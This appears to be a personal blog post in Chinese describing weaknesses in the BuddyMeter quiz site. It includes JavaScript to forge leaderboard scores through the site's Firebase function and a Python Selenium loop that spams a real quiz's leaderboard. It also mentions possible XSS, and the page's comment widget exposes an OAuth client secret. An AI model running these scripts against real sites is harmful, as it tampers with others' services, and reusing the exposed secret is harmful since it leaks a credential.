<html>
<head>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-114741779-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-114741779-1');
    </script>

    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="Hank Lu">
    
    
    <meta name="title" property="og:title" content="IG 匿名問答 BuddyMeter 網頁漏洞 - Hank Lu" />
    <meta name="description" property="og:description" content="&lt;p&gt;最近很流行的 instagram 匿名問答網站 —— &lt;a href=&#34;https://buddymeter.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Buddymetter&lt;/a&gt; ，每個人都在測試自己是不是邊緣人，結果還真的是邊緣人= = 不過因為方便使用加上快速流行，所以還是滿多人跟風的。&lt;/p&gt;">
    
    
    
    <meta name="image" property="og:image"  content="https://luuuy.github.io/buddymeter-bug/6.png" />
    
    <!-- CSS -->
    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
    <link rel="stylesheet" href="/css/bulma.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/prettify.css">
    <script src="/js/fontawesome.js"></script>
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    
    
        <title>IG 匿名問答 BuddyMeter 網頁漏洞 - Hank Lu</title>
    
    
</head>

<script src="/js/prettify.js"></script>

<body onload="PR.prettyPrint()">
    <nav class="navbar is-fixed-top has-shadow is-spaced" role="navigation" aria-label="main navigation">
  <div class="container">
    <div class="navbar-brand">
      <a class="navbar-item" href="/">
        <img src="/images/thinking_face.png"width="30" height="30">
      </a>

      <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </a>
    </div>
    <div class="navbar-menu" id="navMenu">
      <div class="navbar-start">
        <!-- <a class="navbar-item" href="/">
          <span class="icon">
            <i class="fas fa-star"></i>
          </span>
          <span>About Me</span>
        </a> -->
        <a class="navbar-item" href="/">
          <span class="icon">
            <i class="fas fa-book"></i>
          </span>
          <span>Blog</span>
        </a>
      </div>

      <div class="navbar-end">
        <div class="navbar-item">
          <div class="field is-grouped">
            <a target="_blank" class="navbar-item" href="https://github.com/kehanlu">
              <img src="/images/github.svg">
            </a>
          </div>
        </div>
      </div>
    </div>
  </div>
</nav>
    <div class="main">
        <section class="section">
            <div class="container">
                <article>
    <h1 class="title">IG 匿名問答 BuddyMeter 網頁漏洞</h1>
    <h2 class="subtitle">
        2018-07-10
    </h2>

    <div class="content">
        <p>最近很流行的 instagram 匿名問答網站 —— <a href="https://buddymeter.com/" target="_blank" rel="noopener">Buddymetter</a> ，每個人都在測試自己是不是邊緣人，結果還真的是邊緣人= = 不過因為方便使用加上快速流行，所以還是滿多人跟風的。</p>
<a id="more"></a> 
<h2 id="快速得到答案"><a href="#快速得到答案" class="headerlink" title="快速得到答案"></a>快速得到答案</h2><p>這個網站其實很陽春，只要開發人員工具打開就能拿到每一題的答案了。</p>
<img src="/blog/buddymeter-bug/1.png" class="slug">
<p>於是 Splitline 大大把他寫成了一個瀏覽器外掛（真是吃飽太閒= =）</p>
<blockquote>
<p>Chrome: <a href="https://goo.gl/y2Y259" target="_blank" rel="noopener">https://goo.gl/y2Y259</a><br>FireFox: <a href="https://goo.gl/DXhtPU" target="_blank" rel="noopener">https://goo.gl/DXhtPU</a> (支援手機版)<br>Github repo: <a href="https://github.com/splitline/buddymeter-cheater" target="_blank" rel="noopener">https://github.com/splitline/buddymeter-cheater</a></p>
</blockquote>
<div class="fb-video" data-href="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" data-width="600" data-show-text="false"><blockquote cite="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" target="_blank" rel="noopener"></a><p>垃圾網站ㄉ垃圾外掛= =<br>啊上面那ㄍ紅色按鈕就只是讓你都答對拿10分而已就是ㄌ<br><br>Chrome Extension: <a href="https://chrome.google.com/webstore/detail/buddy-meter-%E7%B0%A1%E6%98%93%E5%A4%96%E6%8E%9B/mhmkonllkaljgokjgdaelihochldlgol" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/buddy-meter-%E7%B0%A1%E6%98%93%E5%A4%96%E6%8E%9B/mhmkonllkaljgokjgdaelihochldlgol</a><br>Github Repo: <a href="https://github.com/splitline/buddymeter-cheater" target="_blank" rel="noopener">https://github.com/splitline/buddymeter-cheater</a></p>Posted by <a href="https://www.facebook.com/StarBurstStreammm" target="_blank" rel="noopener">黃志仁</a> on Sunday, May 20, 2018</blockquote></div>


<h2 id="拆解一下"><a href="#拆解一下" class="headerlink" title="拆解一下"></a>拆解一下</h2><h3 id="打開開發人員工具觀察一下原始碼可以發現"><a href="#打開開發人員工具觀察一下原始碼可以發現" class="headerlink" title="打開開發人員工具觀察一下原始碼可以發現"></a>打開開發人員工具觀察一下原始碼可以發現</h3><ul>
<li>用 firebase 當作資料庫</li>
<li>有一個很長的 script element</li>
<li>程式碼有被打亂過</li>
</ul>
<img src="/blog/buddymeter-bug/3.png" class="slug">
<h3 id="把很長的-script-複製到-SublimeText-看一看"><a href="#把很長的-script-複製到-SublimeText-看一看" class="headerlink" title="把很長的 script 複製到 SublimeText 看一看"></a>把很長的 script 複製到 SublimeText 看一看</h3><p>原來各種 function 和 variable 都藏在這裡呢，變數名稱都被打亂了，有耐心一個一個 trace 的話其實很容易發現規則。</p>
<ul>
<li>_0x65bd 存著很多字串，大部分的東西都和他有關。</li>
</ul>
<p>eg: <code>_0x65bd[27] is &quot;uid&quot;</code>, <code>_0x65bd[42] is &quot;questions&quot;</code></p>
<ul>
<li>score=0  只要答對一題就 ++</li>
<li>anserer_name 使用者的名稱（Example:Nikki）</li>
<li>question_number 目前的題數，大於總題數就會送出答案 </li>
<li>載入頁面時從 firebase 撈題目和排行榜的資料出來。</li>
</ul>
<img src="/blog/buddymeter-bug/4.png" class="slug">
<h3 id="送出到-firebase-的-function"><a href="#送出到-firebase-的-function" class="headerlink" title="送出到 firebase 的 function"></a>送出到 firebase 的 function</h3><pre><code class="Javascript">function send_score_to_firebase(score) {
    var _0x3d1ax37 = {};
    _0x3d1ax37[_0x65bd[144] + pollID + _0x65bd[145] + userID + _0x65bd[146]] = answerer_name;
    _0x3d1ax37[_0x65bd[144] + pollID + _0x65bd[145] + userID + _0x65bd[34]] = score;
    var _0x3d1ax38 = firebase[_0x65bd[36]]()[_0x65bd[35]]();
    _0x3d1ax38[_0x65bd[112]](_0x3d1ax37, function(_0x3d1ax14) {
        if (_0x3d1ax14) {} else {} }) }
</code></pre>
<h3 id="自訂分數"><a href="#自訂分數" class="headerlink" title="自訂分數"></a>自訂分數</h3><p>這個 function 將 anserer_name 和 score 存入 firebase，我們只需要修改<code>answerer_name</code> 和 <code>score</code> 就可以達到自訂分數的效果。</p>
<pre><code class="Javascript">anserer_name = &#39;hank&#39;
score = 9.487  //可以是 [0,11) 的浮點數
send_score_to_firebase(score)
</code></pre>
<h2 id="使用-Python-Selenium"><a href="#使用-Python-Selenium" class="headerlink" title="使用 Python + Selenium"></a>使用 Python + Selenium</h2><blockquote>
<p>學術用途，勿傷和氣</p>
</blockquote>
<p>找到好玩的漏洞之後，就可以用自動化的方式來做洗版之類的事（？。</p>
<p><strong> #selenium 可以用來模擬瀏覽器的動作 </strong></p>
<pre><code class="python">from selenium import webdriver
from time import sleep
URL = &quot;https://buddymeter.com/quiz.html?q=t5CA2kC&quot; # splitline 的問卷

def send_score(name,score):
    driver = webdriver.Chrome()
    driver.get(URL)
    sleep(1.5) # 可能要 load data 之類的
    driver.execute_script(
        &quot;answerer_name=&#39;{}&#39;;send_score_to_firebase({});&quot;.format(name,score)
    ) # 執行 Javascript
    sleep(.5)
    driver.close()

# 刷個10次
for i in range(10):
    send_score(&#39;hank&#39;, 9.87) #score is [0~11)的 float
</code></pre>
<img src="/blog/buddymeter-bug/5.png" class="slug">
<h3 id="Local-Storage"><a href="#Local-Storage" class="headerlink" title="Local Storage"></a>Local Storage</h3><p>原本想要直接在 console 裡用 javascript call function 洗版，但由於每次 load 頁面時才會將 firebase 的資料存在 Local Storage ，所以一定要 clear 後 reload 才能以另一個使用者 id 出現在排行榜上，即便是無痕視窗也要手動清空才行呢。所以才用 selenium 來解這個問題。</p>
<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>明明就很想要有人來回，但又不好意思，只好說跟風一下 = =</p>
<h2 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h2><p style="color: red">可以 XSS 呢。</p>

<p>可以插入很多怪怪的東西，各種XSS攻城掠地（？</p>
<img src="/blog/buddymeter-bug/6.png" class="slug">
<p><div id="fb-root"></div></p>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0&appId=141647639903033&autoLogAppEvents=1';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
    </div>

</article>

<div id="toc">
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#快速得到答案"><span class="toc-text">快速得到答案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拆解一下"><span class="toc-text">拆解一下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#打開開發人員工具觀察一下原始碼可以發現"><span class="toc-text">打開開發人員工具觀察一下原始碼可以發現</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#把很長的-script-複製到-SublimeText-看一看"><span class="toc-text">把很長的 script 複製到 SublimeText 看一看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#送出到-firebase-的-function"><span class="toc-text">送出到 firebase 的 function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自訂分數"><span class="toc-text">自訂分數</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-Python-Selenium"><span class="toc-text">使用 Python + Selenium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Storage"><span class="toc-text">Local Storage</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#結論"><span class="toc-text">結論</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#補充"><span class="toc-text">補充</span></a></li></ol>
</div>


<section class="section">
    <div class="container">
        <div class="comments" id="comments">
            
        </div>
    </div>
</section>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
var gitment = new Gitment({
  id: 'item.title',
  owner: 'kehanlu',
  repo: 'kehanlu.github.io',
  oauth: {
    client_id: 'ab9a2a976727d1280778',
    client_secret: 'd2ae4e759980df1644640761690e2c32d58c05b4',
  },
})
gitment.render(document.getElementById('comments'))

$('meta[name="description"]').attr('content',$('.content p').first().text())
</script>
            </div>
        </section>
    </div>
    <div class="footer">
        <footer class="footer">
  <div class="content has-text-centered">
    <p>
      powered by Hank
    </p>
  </div>
</footer>
    </div>

</body>
</html>

<script src="/js/footer.js"></script>
<script src="/js/prettify.js"></script>